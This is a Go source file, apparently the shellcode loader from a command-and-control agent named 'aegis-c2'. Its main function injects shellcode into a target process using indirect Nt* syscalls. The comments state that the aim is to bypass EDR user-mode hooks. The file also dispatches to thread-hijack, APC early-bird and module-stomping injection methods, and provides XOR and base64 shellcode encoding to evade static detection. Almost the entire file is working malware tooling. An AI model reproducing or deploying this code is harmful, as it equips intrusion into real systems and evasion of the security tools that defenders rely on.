//go:build windows && amd64 && cgo

package loader

import (
	"encoding/base64"
	"fmt"
	"unsafe"

	syscallPkg "github.com/aegis-c2/aegis/agent/syscall"
	stub "github.com/aegis-c2/aegis/agent/asm"
	"golang.org/x/sys/windows"
)

// indirectCall 调用 asm 包中的间接 syscall 函数。
var indirectCall = stub.IndirectSyscall

// getSSN 获取 syscall 编号，找不到时返回错误。
func getSSN(st *syscallPkg.SyscallTable, name string) (uint32, error) {
	ssn, ok := st.GetSyscall(name)
	if !ok {
		return 0, fmt.Errorf("syscall not found in ntdll: %s", name)
	}
	return ssn, nil
}

// callSyscall resolves the SSN and executes the indirect syscall.
// Returns NTSTATUS as uintptr (0 = success, non-zero = error).
func callSyscall(st *syscallPkg.SyscallTable, name string, args ...uintptr) uintptr {
	ssn, err := getSSN(st, name)
	if err != nil {
		// Return STATUS_UNSUCCESSFUL (0xC0000001) as NTSTATUS error
		return uintptr(0xC0000001)
	}
	return uintptr(indirectCall(ssn, args...))
}

// injectViaSyscall 使用间接 syscall 执行进程注入，绕过 EDR 用户态钩子。
func injectViaSyscall(cfg *LoadConfig) *LoadResult {
	if cfg.PID <= 0 || len(cfg.Shellcode) == 0 {
		return &LoadResult{
			Success: false,
			Message: "invalid pid or empty shellcode",
		}
	}

	// 1. 解析 ntdll.dll 导出表，提取 SSN
	st := &syscallPkg.SyscallTable{}
	if err := st.ResolveNtdll(); err != nil {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("resolve ntdll: %v", err),
		}
	}

	// 2. NtOpenProcess
	clientID := &struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}{UniqueProcess: uintptr(cfg.PID), UniqueThread: 0}

	objAttrs := make([]byte, 48) // OBJECT_ATTRIBUTES 大小
	*(*uint32)(unsafe.Pointer(&objAttrs[0])) = 48 // Length = sizeof(OBJECT_ATTRIBUTES)
	var hProcess uintptr

	ntStatus := callSyscall(st, "NtOpenProcess",
		uintptr(unsafe.Pointer(&hProcess)),        // ProcessHandle
		uintptr(0x001FFFFF),                        // PROCESS_ALL_ACCESS
		uintptr(unsafe.Pointer(&objAttrs[0])),      // ObjectAttributes
		uintptr(unsafe.Pointer(clientID)),          // ClientId
	)
	if ntStatus != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("NtOpenProcess failed: 0x%X", uint32(ntStatus)),
		}
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	// 3. NtAllocateVirtualMemory
	allocSize := uintptr(len(cfg.Shellcode))
	baseAddr := uintptr(0)

	ntStatus = callSyscall(st, "NtAllocateVirtualMemory",
		hProcess,                                   // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddr)),         // BaseAddress
		0,                                          // ZeroBits
		uintptr(unsafe.Pointer(&allocSize)),        // RegionSize
		uintptr(0x3000),                            // MEM_COMMIT | MEM_RESERVE
		uintptr(0x04),                              // PAGE_READWRITE
	)
	if ntStatus != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("NtAllocateVirtualMemory failed: 0x%X", uint32(ntStatus)),
		}
	}

	// 4. NtWriteVirtualMemory
	bytesWritten := uintptr(0)
	ntStatus = callSyscall(st, "NtWriteVirtualMemory",
		hProcess,                                   // ProcessHandle
		baseAddr,                                   // BaseAddress
		uintptr(unsafe.Pointer(&cfg.Shellcode[0])), // Buffer
		uintptr(len(cfg.Shellcode)),                // BufferSize
		uintptr(unsafe.Pointer(&bytesWritten)),     // NumberOfBytesWritten
		0,                                          // unused
	)
	if ntStatus != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("NtWriteVirtualMemory failed: 0x%X", uint32(ntStatus)),
		}
	}

	// 5. NtProtectVirtualMemory — RW → RX
	oldProtect := uintptr(0)
	ntStatus = callSyscall(st, "NtProtectVirtualMemory",
		hProcess,                                   // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddr)),         // BaseAddress
		uintptr(unsafe.Pointer(&allocSize)),        // RegionSize
		uintptr(0x20),                              // PAGE_EXECUTE_READ
		uintptr(unsafe.Pointer(&oldProtect)),       // OldProtect
		0,                                          // unused
	)
	if ntStatus != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("NtProtectVirtualMemory failed: 0x%X", uint32(ntStatus)),
		}
	}

	// 6. NtCreateThreadEx
	var hThread uintptr
	ntStatus = callSyscall(st, "NtCreateThreadEx",
		uintptr(unsafe.Pointer(&hThread)),          // ThreadHandle
		uintptr(0x1FFFFF),                          // THREAD_ALL_ACCESS
		0,                                          // ObjectAttributes
		hProcess,                                   // ProcessHandle
		baseAddr,                                   // StartRoutine
		0,                                          // Argument
		0,                                          // CreateFlags
		0,                                          // ZeroBits
		0,                                          // StackSize
		0,                                          // MaxStackSize
		0,                                          // AttributeList
	)
	if ntStatus != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("NtCreateThreadEx failed: 0x%X", uint32(ntStatus)),
		}
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	return &LoadResult{
		Success: true,
		Message: "shellcode injected successfully via indirect syscalls",
	}
}

// Inject 执行进程注入。
// 根据 cfg.Method 选择注入方法：
//   - MethodWindowsAPI:       CreateRemoteThread（标准 API）
//   - MethodIndirectSyscall:  间接 Nt* syscall（绕过 EDR 钩子）
//   - MethodThreadHijack:     劫持已有线程（无 CreateRemoteThread IOC）
//   - MethodFiberAPC:         Fiber Injection + APC（本地线程转换）
//   - MethodAPCEarlyBird:     APC Early Bird（挂起进程 + QueueUserAPC）
func Load(cfg *LoadConfig) *LoadResult {
	// 向后兼容：UseSyscall=true 等价于 MethodIndirectSyscall
	if cfg.UseSyscall || cfg.Method == MethodIndirectSyscall {
		return injectViaSyscall(cfg)
	}
	if cfg.Method == MethodStompHijack {
		return InjectViaStompHijack(cfg)
	}
	if cfg.Method == MethodAPCEarlyBird {
		return InjectViaAPCEarlyBird(cfg)
	}
	if cfg.Method == MethodThreadHijack {
		return InjectViaThreadHijack(cfg)
	}
	if cfg.Method == MethodFiberAPC {
		return InjectViaFiber(cfg)
	}
	// 默认 Module Stomping + Thread Hijack（合法 DLL .text 覆写 + 劫持线程，无 CreateRemoteThread，无 RWX）
	return InjectViaStompHijack(cfg)
}

// EncodeShellcode 对 shellcode 进行编码以绕过静态检测。
func EncodeShellcode(shellcode []byte, encoding string) ([]byte, error) {
	switch encoding {
	case "xor":
		key := byte(0xAB)
		encoded := make([]byte, len(shellcode))
		for i, b := range shellcode {
			encoded[i] = b ^ key
		}
		return encoded, nil
	case "base64":
		return []byte(base64.StdEncoding.EncodeToString(shellcode)), nil
	case "aes":
		return nil, fmt.Errorf("AES encoding requires crypto implementation")
	default:
		return shellcode, nil
	}
}

// DecodeShellcode 解码编码后的 shellcode。
func DecodeShellcode(encoded []byte, encoding string) ([]byte, error) {
	switch encoding {
	case "xor":
		key := byte(0xAB)
		decoded := make([]byte, len(encoded))
		for i, b := range encoded {
			decoded[i] = b ^ key
		}
		return decoded, nil
	case "base64":
		return base64.StdEncoding.DecodeString(string(encoded))
	default:
		return encoded, nil
	}
}
